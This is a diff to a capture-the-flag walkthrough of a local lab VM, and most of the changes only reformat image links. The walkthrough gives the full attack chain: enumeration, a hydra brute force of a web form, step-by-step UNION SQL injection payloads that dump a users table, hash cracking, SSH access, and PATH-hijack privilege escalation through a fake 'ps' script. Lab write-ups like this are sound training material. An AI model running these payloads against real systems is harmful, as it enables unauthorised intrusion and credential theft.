@@ -1,7 +1,7 @@
 **Enumeration**
 netdiscover -r 192.168.1.0/24
 
-![[netdiscover find ip.png]]
+![netdiscover](images/netdiscoverfindip.png)
 
 Attacker : 192.168.1.128
 Target   : 192.168.1.130
@@ -9,7 +9,7 @@ Target   : 192.168.1.130
 scan service and version target
 nmap -sV 192.168.1.130
 
-![[nmap.png]]
+![nmap](images/nmap.png)
 
 ssh port not defalut use port 777
 
@@ -17,7 +17,7 @@ ssh port not defalut use port 777
 http://192.168.1.130
 website has only 1 pic
 
-![[web 1.png]]
+![website](images/web1.png)
 
 
 source code and inspect element not found hint
@@ -26,18 +26,18 @@ then inspect metadata pic
 wget http://192.168.1.130/main.gif
 use exiftool main.gif
 
-![[exiftool pic.png]]
+![exiftool](images/exiftoolpic.png)
 
 found comment : P- ): kzMb5nVYJw
 
 try http://192.168.1.130/kzMb5nVYJw
 
-![[web2.png]]
+![website-2](images/web2.png)
 source code and inspect element found hint key not complex
 
-![[web2inspect.png]]
+![web-inspect](images/web2inspect.png)
 
-![[web2burp.png]]
+![web-burp](images/web2burp.png)
 
 **Brute Force**
 then brute force with hydra
@@ -46,42 +46,42 @@ hydra -l user -P /usr/share/wordlists/rockyou.txt \
 192.168.1.130 http-form-post \
 "/kzMb5nVYJw/index.php:key=^PASS^:invalid key"
 
-![[web2bruteForce.png]]
+![web-bruteforce](images/web2bruteForce.png)
 
 key = elite
 after send key = elite
 
-![[web3.png]]
+![website-3](images/web3.png)
 
 inspect website
-![[web3source.png]]
+![web-source](images/web3source.png)
 
 try to form action
-![[web3action.png]]
+![web-action](images/web3action.png)
 
 try to sent parameter
 420search.php?usrtosearch="
 
-![[web3sql.png]]
+![web-sql](images/web3sql.png)
 
 response = SQL syntax error near '%"'
 and database is MySQL
 
 **SQL Injection**
 send : "--
-![[web3sql2.png]]
+![web-sql-2](images/web3sql2.png)
 
 send: "--+(+ is spacebar)
-![[web3sql3.png]]
+![web-sql-3](images/web3sql3.png)
 after add spacebar -- is comment
 
 send: " union select "1"; --+(+is spaceBar)
 
-![[web3numberColumn.png]]reponse : different number of columns
+![web-number-column](images/web3numberColumn.png)reponse : different number of columns
 
 send: " union select "1","2","3"; --+(+is spaceBar)
 
-![[web3numberColumn2.png]]
+![web-number-column-2](images/web3numberColumn2.png)
 
 fetched data successfully can join 3 column
 
@@ -89,7 +89,7 @@ fetched data successfully can join 3 column
 
 send: " union select user(),@@version,database(); --+(+is spaceBar)
 
-![[web3findUserVersionDatabase.png]]
+![web-find-user-version-database](images/web3findUserVersionDatabase.png)
 
 user = root@localhost
 database version= 5.5.44-0+deb8u1
@@ -99,18 +99,18 @@ send: " union select schema_name,"2","3" from information_schema.schemata; --+(+
 
 for find all database name
 
-![[web3findAllDatabase.png]]
+![web-find-all-database](images/web3findAllDatabase.png)
 
 for find table name
 
 send: " union select table_schema,table_name,"3" from information_schema.tables where table_schema='seth'; --+(+is spaceBar)
 
-![[web3findTableInDatabase='seth'.png]]table_schema = database -> seth
+![web-find-table-in-database](images/web3findTableInDatabase-seth.png)table_schema = database -> seth
 table_name = users
 
 send: " union select table_schema,column_name,"3" from information_schema.columns where table_name='users'; --+(+is spaceBar)
 
-![[web3findColumnInTable=users.png]]database = seth
+![web-find-column-in-users-table](images/web3findColumnInTable-users.png)database = seth
 table = users
 column = id,user,pass,position
 
@@ -119,13 +119,13 @@ send: " union select user,pass,concat(id," ",position) from users; --+(+คื�
 
 for dump data in database=seth,table=users
 
-![[web3findUserPass.png]]
+![web-find-user-password](images/web3findUserPass.png)
 now have user and password but password is encoding
 use hashes.com for decode
 
-![[hash1.png]]
+![hash-1](images/hash1.png)
 
-![[hash2.png]]
+![hash-2](images/hash2.png)
 
 found pass = omxxx
 
@@ -135,7 +135,7 @@ from nmap ssh at port 777
 user=ramses
 pass= omxxx
 
-![[ssh.png]]
+![ssh](images/ssh.png)
 
 now user is ramses not root
 
@@ -149,15 +149,15 @@ cat .bash_history
 
 for read all command in history
 
-![[ls -la.png]]
+![ls-la](images/ls-la.png)
 
 go to path procwatch
 
-![[goToPathProcwatch.png]]
+![go-to-path-procwatch](images/goToPathProcwatch.png)
 
 run procwatch
 
-![[runProcwatch.png]]
+![run-procwatch](images/runProcwatch.png)
 
 procwatch have run file sh and ps
 create file shell ps
@@ -165,7 +165,7 @@ create file shell ps
 echo /bin/sh > ps
 chmod 777 ps
 
-![[createShellForProcwatch.png]]
+![create-shell-for-procwatch](images/createShellForProcwatch.png)
 
 echo $PATH
 /usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
@@ -179,8 +179,10 @@ if want to run procwatch by root permission need to add /var/www/backup
 
 export PATH=/var/www/backup:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
 
-![[exportPathForPrivilageEscalationByProcwatch.png]]
+![export-path-for-privilege-escalation-procwatch](images/exportPathForPrivilageEscalationByProcwatch.png)
 
 run procwatch with root permission
 
-![[root.png]]
+![root](images/root.png)
+
+finish
